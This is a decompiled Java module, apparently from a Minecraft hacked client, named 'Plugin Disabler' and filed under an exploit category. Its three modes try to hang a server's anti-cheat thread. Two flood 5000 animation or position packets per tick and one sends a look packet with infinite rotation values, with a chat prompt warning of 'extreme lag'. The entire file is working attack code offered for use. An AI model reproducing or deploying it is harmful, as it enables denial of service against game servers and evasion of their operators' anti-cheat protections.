/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  store.intent.intentguard.annotation.Native
 */
package me.uncodable.srt.impl.modules.impl.exploits;

import me.uncodable.srt.Ries;
import me.uncodable.srt.impl.events.api.EventTarget;
import me.uncodable.srt.impl.events.events.entity.EventUpdate;
import me.uncodable.srt.impl.events.events.packet.EventSendChatMessage;
import me.uncodable.srt.impl.modules.api.Module;
import me.uncodable.srt.impl.modules.api.ModuleInfo;
import me.uncodable.srt.impl.modules.api.settings.Setting;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.util.ChatComponentText;
import store.intent.intentguard.annotation.Native;

@ModuleInfo(internalName="PluginDisabler", name="Plugin Disabler", desc="Allows you to *literally* handicap an entire plugin.", category=Module.Category.EXPLOIT, exp=true)
public class PluginDisabler
extends Module {
    private static final String COMBO_BOX_SETTING_NAME = "Disabler Mode";
    private static final String SHATTER = "Anti-Cheat Thread Shatter";
    private static final String SHATTER_II = "Anti-Cheat Thread Shatter II";
    private static final String SHATTER_III = "Anti-Cheat Thread Shatter III";
    private boolean confirmed;

    public PluginDisabler(int key, boolean enabled) {
        super(key, enabled);
        Ries.INSTANCE.getSettingManager().addComboBox(this, "INTERNAL_GENERAL_COMBO_BOX", COMBO_BOX_SETTING_NAME, SHATTER, SHATTER_II, SHATTER_III);
    }

    @Override
    public void onEnable() {
        switch (Ries.INSTANCE.getSettingManager().getSetting(this, "INTERNAL_GENERAL_COMBO_BOX", Setting.Type.COMBO_BOX).getCurrentCombo()) {
            case "Anti-Cheat Thread Shatter III": 
            case "Anti-Cheat Thread Shatter II": 
            case "Anti-Cheat Thread Shatter": {
                Ries.INSTANCE.msg("This plugin disabler will require you to login after usage. Toggle off the plugin disabler when finished.");
                Ries.INSTANCE.msg("Type \"yes\" in chat to confirm, otherwise type \"no\" to cancel.");
            }
        }
    }

    @Override
    public void onDisable() {
        switch (Ries.INSTANCE.getSettingManager().getSetting(this, "INTERNAL_GENERAL_COMBO_BOX", Setting.Type.COMBO_BOX).getCurrentCombo()) {
            case "Anti-Cheat Thread Shatter III": 
            case "Anti-Cheat Thread Shatter II": 
            case "Anti-Cheat Thread Shatter": {
                if (!this.confirmed) break;
                PluginDisabler.MC.thePlayer.sendQueue.handleDisconnect(new S40PacketDisconnect(new ChatComponentText(String.format("\u00a75[\u00a7d\u00a7l%s\u00a75] Please log back in.", Ries.INSTANCE.getName()))));
            }
        }
        this.confirmed = false;
    }

    @EventTarget(target=EventUpdate.class)
    @Native
    public void onUpdate(EventUpdate e) {
        switch (Ries.INSTANCE.getSettingManager().getSetting(this, "INTERNAL_GENERAL_COMBO_BOX", Setting.Type.COMBO_BOX).getCurrentCombo()) {
            case "Anti-Cheat Thread Shatter": {
                if (!this.confirmed) break;
                for (int i = 0; i < 5000; ++i) {
                    PluginDisabler.MC.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
                }
                break;
            }
            case "Anti-Cheat Thread Shatter II": {
                if (!this.confirmed) break;
                for (int i = 0; i < 5000; ++i) {
                    PluginDisabler.MC.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(PluginDisabler.MC.thePlayer.posX, PluginDisabler.MC.thePlayer.posY, PluginDisabler.MC.thePlayer.posZ, PluginDisabler.MC.thePlayer.rotationYaw, PluginDisabler.MC.thePlayer.rotationPitch, true));
                }
                break;
            }
            case "Anti-Cheat Thread Shatter III": {
                if (!this.confirmed) break;
                PluginDisabler.MC.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(Float.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, true));
            }
        }
    }

    @EventTarget(target=EventSendChatMessage.class)
    public void onChat(EventSendChatMessage e) {
        switch (e.getMessage().toLowerCase()) {
            case "yes": {
                Ries.INSTANCE.msg("Attempting to hang the anti-cheat thread... (this may cause extreme lag!)");
                this.confirmed = true;
                e.setCancelled(true);
                break;
            }
            case "no": {
                Ries.INSTANCE.msg("Cancelled.");
                this.toggle();
                e.setCancelled(true);
            }
        }
    }
}

